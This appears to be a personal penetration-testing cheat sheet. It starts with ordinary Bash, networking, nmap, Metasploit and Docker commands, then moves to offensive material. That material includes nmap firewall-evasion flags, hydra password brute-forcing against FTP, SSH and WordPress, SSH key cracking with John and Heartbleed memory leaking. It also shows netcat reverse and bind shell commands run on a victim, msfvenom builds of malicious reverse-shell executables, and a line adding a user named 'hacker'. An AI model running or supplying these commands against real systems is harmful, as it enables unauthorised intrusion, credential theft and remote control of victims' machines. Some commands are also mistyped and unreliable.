-BASH Shell Shortcuts and Shorthand-
ctrl + c – terminate the currently running command
ctrl + r – search the current terminal session’s command history
ctrl + a – go to the start of line (useful if you need to correct a typo at the beginning of a very long command)
ctrl + e – go the the end of line
ctrl + z – sleep program
!! – reissues the last command that was run
![command] (i.e. !ping) – reissues the last command starting with the supplied parameters, which is the last ping command in this example
Up arrow – search through the cached history of previously run commands
Down arrow – sort through the history of used commands to the most recent command
Tab – the tab key is useful for auto-completing file and directory names within the current working directory, which save you the trouble of having to type them out

-Basic Shell Commands-
mount – displays mounted media and file systems
uptime – displays how long the system has been active
clear – if there is too much information printed to the current terminal screen, you can wipe it all clean with the clear command
date – displays the time and date that is configured within the operating system
whoami – displays the current active user in the shell
su root – prompts you for a root password to login and run commands with root privileges
pwd – prints your current working directory, which is your current location in the file system
ls – this is the list command, which prints the files and directories within your current working directory
ls -l – this option is known as a “long listing,” and shows detailed information about the files and directories in your current working directory
ls -la – this command will show you a long listing, and the -a option shows you all files; by default, hidden files that start with the “.” character are omitted
cd [directory] – the cd command is useful for navigating the Linux files system; simply perform an ls command to see directories accessible in your current working directory
cd ../ – this command will set you one level higher in the current working directory tree
[command] | grep [parameters] (i.e. ls | grep myfile.txt) – piping command output to grep and supplying it with parameters will filter the output based on your criteria
ps aux – displays a list of running processes; the output is long, so it’s best to pipe it to less, more, or search through it with a tool like grep
kill [process_number] – kills a process based on it’s process ID identified with the ps aux command
useradd -p 'openssl passwd -1 <Password>' hacker 
cat file | sort | uniq – Sort and delete duplicates
wc -l <file> – Count lines
wc -c – Count chars
xxd -p boot12.bin | tr -d '\n' – Get HexDump without new lines
openvpn "/x.ovpn" -> connects to a vpn
mkdir "name" -> creates a directory
rmdir "dir" -> remove directory
touch "file.format" -> create a file
echo "foo" > "file.format" ->  write file
echo "foo" >> "file.format" -> append write file
nano "file.txt" -> create a file and open writing interface
chmod 4777 -> changes permissions
chmod +t "file" -> add sticky bit
chown "user":"group" "/directory" -> change propietary and group in a file or directory
chgrp "user" "/directory" -> change user in directory
cat /etc/passwd | grep "name" -> search username
cat /etc/group | grep "name" -> search group
useradd "name" -s /bin/bash -/home/pepe -> create a user with a shell and home directory
deluser -> deletes username
groupadd "name" -> create a group
usermod -a -G "group" "user"  -> add user to a group
delgroup "name" -> delete group
deluser "user" "group" -> remove user from group
cp "file" -> copy file
cp "file" "/dir" -> copy file in directory
cp "file" "file" -> change name
mv "file" "/dir" -> move file
lsattr -> show file attributess
chattr "+i" -> change attributess
which -> show absolute route
./"binary" bash -p -> open SUID binary 
apt update -> update system
apt full-updgrade -y -> upgrade system
ps -faux -> show running processes
./"script".sh -> run script
jobs -> list all jobs
jobs -r -> show running jobs
jobs -s -> show suspended jobs
kill % "x" -> kills the job id
echo $SHELL -> show bash directory
openvpn "vpn" -> connect to vpn
killall openvpn -> kill processes
ssh "user"@"ip" -p "port" -> connect though ssh
hostnamectl -> show host info
sort "file.txt" | uniq -u -> sort items in a file that only appears once
grep "word" "file" -> search word in a file or text
base64 "file" -> encode data in base64
base64 -d "file" -> decode data in base64
file "file" -> show file info
xxd  "file" -> convert data in hexdump
xxd -r "file" -> reverts hexdump
xxd -ps "file" -> compact hexdump
echo $? -> show las command output code
tail +/- "number" -> select output starting by the end
head +/-  "number" -> select lane output
awk 'NF{print$NF}' -> print an argument, NF chooses last one
egrep -v "word" -> remove lane that contains "word"
 fsof -i:"port" -> show what is running in "port"
mktemp -d -> create a temporal tmp directory
diff "file1" "file2" -> show differences between two files
md5sum -> create a hash from a file
mount -t cifs //"host"/"resource" "/dir/mount" -> mounts(download) file or directory from a host (port 445 in this case) to our directory
umount "/dir/mount" -> dismount, you must give route

-Decompress-
tar -xvzf /path/to/yourfile.tgz
tar -xvjf /path/to/yourfile.tbz
bzip2 -d /path/to/yourfile.bz2
tar jxf file.tar.bz2
gunzip /path/to/yourfile.gz
unzip file.zip
7z -x file.7z
sudo apt-get install xz-utils; unxz file.xz
7z l file.zip - List files inside zip
du -hc "file" -> show file size

-Network Interface and IP Commands-
ifconfig – the same as the ipconfig on Windows systems; this command will display interface information, such as MAC address, IPv4/IPv6 addresses, interface status, transmitted and received data, and so on
ifconfig [interface] down (i.e. ifconfig eth0 down) – shuts down an interface, such as a wireless, Ethernet, or tunnel interface
ifconfig [interface] up (i.e. ifconfig eth0 up) – enables an interface that has been shut down; taking an interface down and then up again (sometimes called bouncing an interface) can be a useful troubleshooting or reset procedure
route – displays the current routing table, including the default route

-Port and Service Commands-
netstat -l – shows ports that are in a listening state
netstat -a – shows all ports (sometimes called sockets) that are in use
netstat -u – shows all UDP connections and ports that are open
netstat -t – shows all TCP connections and ports that are open
netstat -a | grep [protocol] (i.e. netstat -a | grep http) – searchs all open connections and ports for any that contain the characters “http”

-NMAP Command Reference -
-TARGET SPECIFICATION-
-iL <inputfilename>: Input from list of hosts/networks
-iR <num hosts>: Choose random targets
–exclude <host1[,host2][,host3],…>: Exclude hosts/networks
–excludefile <exclude_file>: Exclude list from file
-HOST DISCOVERY-
-sL: List Scan – simply list targets to scan
-sn: Ping Scan – disable port scan
-Pn: Treat all hosts as online — skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
–dns-servers <serv1[,serv2],…>: Specify custom DNS servers
–system-dns: Use OS’s DNS resolver
–traceroute: Trace hop path to each host
-SCAN TECHNIQUES-
-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan
-sN/sF/sX: TCP Null, FIN, and Xmas scans
–scanflags <flags>: Customize TCP scan flags
-sI <zombie host[:probeport]>: Idle scan
-sY/sZ: SCTP INIT/COOKIE-ECHO scans
-sO: IP protocol scan
-b <FTP relay host>: FTP bounce scan
-PORT SPECIFICATION AND SCAN ORDER-
-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
-F: Fast mode – Scan fewer ports than the default scan
-r: Scan ports consecutively – don’t randomize
–top-ports <number>: Scan <number> most common ports
–port-ratio <ratio>: Scan ports more common than <ratio>
-SERVICE/VERSION DETECTION-
-sV: Probe open ports to determine service/version info
–version-intensity <level>: Set from 0 (light) to 9 (try all probes)
–version-light: Limit to most likely probes (intensity 2)
–version-all: Try every single probe (intensity 9)
–version-trace: Show detailed version scan activity (for debugging)
-OS DETECTION-
-O: Enable OS detection
–osscan-limit: Limit OS detection to promising targets
–osscan-guess: Guess OS more aggressively
-Host and Subnet Target Syntax-
nmap [host] (i.e. nmap 10.10.10.1) – tells NMAP to target a single IP address
nmap [domain] (i.e. nmap www.myserver.com) – tells NMAP to target a specific host, but that host needs to be resolvable with DNS
nmap [range] (i.e. nmap 10.10.10.1-5) – specifies a range of IP addresses for NMAP to target
nmap [subnet] (i.e. nmap 10.10.10.0/24) – tells NMAP to scan an entire subnet with a variable length subnet mask
nmap -iL [import_host_list.txt] (i.e. nmap -iL myhostlist.txt) – allows you to import a list of hosts from other sources 
-Port Scanning Target Syntax-
nmap -p 80 10.10.10.1 – scans a host to see if it is accepting connections on a specific port (port 80 in this case)
nmap -p 80-100 10.10.10.1 – scans a host to see if it is accepting connections on a range of ports (port 80 in this case)
nmap -F 10.10.10.1 – the -F options stands for “fast,” and will scan one hundrede of the most commonly used ports on a host
nmap -p- 10.10.10.1 – scans all ports on a host, but is rather slow 
-Port Scanning Options Syntax-
nmap -sT 10.10.10.1 – initiates a scan using TCP connections
nmap -sU 10.10.10.1 – initiates a scan using UDP connections
nmap -Pn 10.10.10.1 – initiates a port scan using selected ports, and omits the active port discovery process
nmap -sS 10.10.10.1 – initiates a TCP SYN scan 
-Identifying Hosts’ Operating System and Active Services-
nmap -sV 10.10.10.1 – basic service scanning and detection
nmap -sV –version-intensity [0-9] 10.10.10.1 – sometimes a probe won’t be able to identify a host’s operating system, so you can turn up the probing intensity with a value between 0 and 9. 9 is the most intense scan, which will try all available NMAP probes, but will also take longer
nmap -sA 10.10.10.1 – NMAP will scan the specified host to identify its active services and operating System
-NMAP Output-
Nmap -oX MyOutputFile.xml 10.10.10.1 – save output in an XML format
Nmap -oG MyOutputFile.txt 10.10.10.1 – save the default output to a text file
Nmap -oN MyOutputFile.txt 10.10.10.1 – save output in a GREP readable format (which can be accessed, searched, and filtered with the grep command)
Nmap -oA MyOutputFile 10.10.10.1 – save output in all formats

-Database Commands-
I had mentioned earlier that NMAP commands can be used in the Metasploit database. Metasploit comes with a lot of handy tools to build lists of hosts and run commands against those targets using NMAP commands as follows:
db_nmap [nmap_command_syntax] – the basic syntax of NMAP commands within Metasploit
db_nmap -v -Pn 10.10.10.0/24 – scans the 10.10.10.0/24 subnet with a basic port scan in verbose mode, and adds those hosts to the database
db_export – exports your current database to a file and location of your choosing 
db_import – imports a database from another source
db_status – displays the status of the database; if everything is in working order, this command should return a status of “connected
hosts – prints a list of all the discovered hosts in the database, which could have been discovered from NMAP commands 
hosts -a [ip_address] – adds an IP address, range, or subnet to the hosts database list
hosts -d [ip_address] – deletes an IP address, range, or subnet from the hosts database list
hosts -u – prints all of the hosts that are known to be up

-Metasploit Command Reference -
-Core Metasploit Command-
msfupdate – runs the automatic update function, and looks for any new exploits and vulnerabilities; note that this is run from the standard command line 
msfconsole – this command is how to enter the Metasploit environment and receive the msf > prompt in the terminal
show exploits – displays all exploits in the terminal (should be piped to another command or filtered for better results)
show payloads – prints all currently known payloads to the terminal (should be piped or searched with a command like grep)
show auxiliary – displays all auxiliary modules that are contained in the Metasploit framework
help – shows the main help page for Metasploit
search [name] – searches through the exploits and modules for any labeled with strings matching the supplied name
info – displays information about a certain module or exploit
use [name] – loads a module or exploit 
lhost [IP_address] – this should be set to your interface’s local IP address, especially if you’re currently on the same subnet or network as the target
rhost [IP_address] – use this command to set the IP address(es) of the target(s) you wish to target with the exploit 
show options – displays all of a modules or exploits parameters that can be set; essentially a sub-help menu for an individual module that lists all of its commands
show targets – displays which targets and systems can be targeted for a given module
check – checks to see if the currently set target is vulnerable to the attack or exploit
-Docker-
systemctl start docker -> starts docker
docker ps -> show containers
docker images -> show images
docker volume ls -> show volumes
docker build -t "dockerfile" . -> builds a image
docker run -dit --name "container image" "image" -> run container
docker run -dit -p22:22 --name "container image" "image" -> run container with port forwarding. Our port 22 becomes container's port 22
docker rm "container id" --force -> remove container
docker volume rm $(docker volume ls  -q) -> remove volumes
docker rm $(docker ps -a -q) --force -> remove all containers
docker rmi "container id" --force -> remove image
docker rmi $(docker images -q) --force -> remove all images
docker exec -it "container" bash -> execute container's shell


_____________________________________________________


-ENUMERATION-

-Discover ports: NMAP useful commands-
nmap -p- "ip" -> scan all the ports
nmap --top-ports 500 "ip" -> scan most popular ports
nmap --open "ip" -> report only open ports
nmap -p- --open "ip" -v -> show open ports in verbose mode
nmap "ip" -n -> don't search DNS
nmap T5/4/3/2/1 "ip" -> search speed, 5 fast 0 slow
nmap "ip" -Pn -> ignore closed ports
nmap -sn "ip" -> show hosts connected
-FIREWALL EVASION- 
nmap -p"port" -f -> send fragmented packets then evade firewall
nmap "ip" -D "fake ip" "fake ip 2" "fake ip 3" ... -> send packets from multiples IP
nmap "ip" --source-port "port" -> send packets from a possible white port with no firewall
nmap "ip" --spoof-mac "manufacturer" -> falsificate MAC address
nmap -sS "ip" -> more silent

nmap -p"port","port"... "ip" -sCV -> show ports service versions
nmap -p- --open -sS --min-rate 5000 "IP" -v -n -Pn -> very good nmap command

-Discover hosts in local net-
arp-scan -I "net interface" --localnet --ignoredups
masscan -"port","port"... -Pn "ip" --rate=10000 -> rate 10000 packets x second

-Fuzzing: discovering directories-
Gobuster
./gobuster dir -u "URL" -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x php,html,txt -b "code" -> -x will show extensions, -b will blacklist wrong codes
Wfuzz
wfuzz -c --hc="code"-t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt www.url.com/FUZZ -> -c output color, -t threads, --hc hidde code. Where /FUZZ, we can add extensions like /FUZZ.html, /FUZZ.php, /FUZZ.txt...  For add more routes, URL/FUZZ/FUZ2Z/FUZ3Z ...
Ffuf
./ffuf -c -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "URL"/FUZZ --mc="code" -> mc hiddes code

-Discovering subdomains-
-PASIVE-
ctfr
python3 ctfr.py -d "URL"
sublist3r
python3 sublist3r.py -d "URL"
-ACTIVE-
Gobuster
gobuster vhost -u "URL" -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 | grep -v "code"
wfuzz
wfuzz -c --hc="code" -t 20 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H '"Host: FUZZ."URL"' "URL"

-PORTS ENUMERATION-

-Discover Technologies-
whatweb "URL" -> show web technologies

-FTP enumeration: port 21-
ftp "IP" -> acces to ftp server, try username "anonymous" and no password 
nmap -- script ftp-anon -p21 "IP" -> script that checks if anonymous is allowed
Hydra brute force
hydra -I «user» -P «/usr/share/wordlists/rockyou.txt» ftp://"IP" -t 15 → -l because we know the user, -P for give password list, -t gives number of threads for operate in paralel

-SSH enumeration: port 22-
ssh user@"IP" -p 22 -> connect to ssh server
hydra -l «user» -P «/usr/share/wordlists/rockyou.txt» ssh://"IP" -s "port" -> 
nmap -sCV -p22 "IP" -> scan SSH port version. When you have it, you can go to web launchpad.net to check the codename 
- SSH private key via JohnTheRipper -
~/ssh2john(.py) id_rsa > john-readable.txt -> translate private key to JohnTheRipper readable
/john(.py) john-readable.txt --wordlist=~/rockyou.txt

-HTTP enumeration: port 80,443-
openssl s_client -connect "ip":"port"  -> show ssl certificate info
sslscan "domain":"port" -> show ssl protocols and vulnerabilities
nmap --script ssl-heartbleed -p"port" "IP" -> script that checks if is vulnerable to heartbleed
python3 ssltest.py -p "port" | grep -v "chains with 0s" -> shows memory, that way we can look for any information in some readable text.  You can run it repeteadly, because sometimes shows different data.

-SMB enumeration: port 445,139-
smbclient -L "host" -N -> port 445, list shared resources, -N if we don't have credentials
smbclient //"host"/"r esource" -N -> connects to open resource
smbmap -H "host" -> same as smbclient
nmap --script smb-brute.nse -p"port" "IP" -> enumerates SMB users
/usr/bin/enum4linux -a "IP" -> enumerates SMB users. Very useful



-CMS ENUMERATION-

-Wordpress-
wpscan --url "WP URL" -> scans wordpress web
wpscan --url "WP URL" -e vp,u -> enumerate (-e) vulnerable plugins (vp) and users (u)
wpscan --url "WP URL" -e vp, u --api-token="'your api token'" -> you can get an api token from wpscan web, if you give it to the command it will show you more info 
Directories
 "WP URL"/wp-content/plugins/ -> some times in this directory you can see installed plugins
curl -s -X GET "WP URL" | grep "plugins" ->  you can see web code and look for plugins
searchsploit "plugin" -> shows plugin exploits
"WP URL"/xmlrpc.php/ -> you can enumerate valid credentials
wpscan --url "URL:port" -U "user" -P /usr/share/wordlists/rockyou.txt ->  search password by given user

-Joomla-
perl joomscan.pl -u "JOOMLA URL" -> show vulnerabilities 

-Drupal-
droopscan scan drupal --url "URL" -> show vulnerabilities 

-SEARCH SPLOIT-
searchsploit "wordpress user enumeration (i.e)" -> searchsploit is a tool that shows you registered exploits
searchsploit -x "id" -> shows the exploit


_______________________________________________________________________


-EXPLOIT CONCEPTS-

- Shell -
-Reverse Shell-
The victim's server is connected to attacker machine
nc -nlvp 443 -> run this command in your machine, it is a listen mode. 
-n don't check DNS, -l listen all connections (listen mode), -v verbose, -p  port to listen
ncat -e /bin/bash "IP"  443 -> run this command in victim's server, it creates a bash that you can run from listening command
script /dev/null -c bash -> run this command in victim's server, it shows the bash in a more beautyful way (pseudo console)
-Bin Shell-
The attacker's machine is connected to victim's server
nc -nlvp 443 -e /bin/bash -> run this command in victim's server, it offers a bash to anyone who connects through indicated port
nc "IP" "port" -> run this command in your machine, it connects to the port and if is a bash offered, you can run commands
-Forward Shell-
You have to use Forward Shell when victim server has a firewall and you can't use Reverse Shell.

- Payloads -
--Staged-
--Metasploit--
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST="my IP" LPORT="myPORT" -f exe -o reverse.exe -> creates a malicious binary, it has to be executed in victim's machine and gives you a reverse shell
msfdb run -> metasploit run and sets the listener
-- use exploit/multi/handler
-- set payload windows/x64/meterpreter/reverse_tcp
-- set LHOST "my IP"
-- set LPORT "my PORT"
run the .exe
you have acces to the console
-Non-staged-
msfvenom -p windows/x64/meterpreter_reverse_tcp --platform windows -a x64 LHOST="my IP" LPORT="myPORT" -f exe -o reverse.exe
--Netcat--
msfvenom -p windows/x64/shell_reverse_tcp --platform windows -a x64 LHOST="my IP" LPORT="myPORT" -f exe -o "reverse.exe" 
-- rlwrap nc -nlvp "port" -> if the victim has executed the .exe, you can enter in the bash with netcat
rlwrap gives you a better shell

 - Exploits -
-Automated-
-Manual-
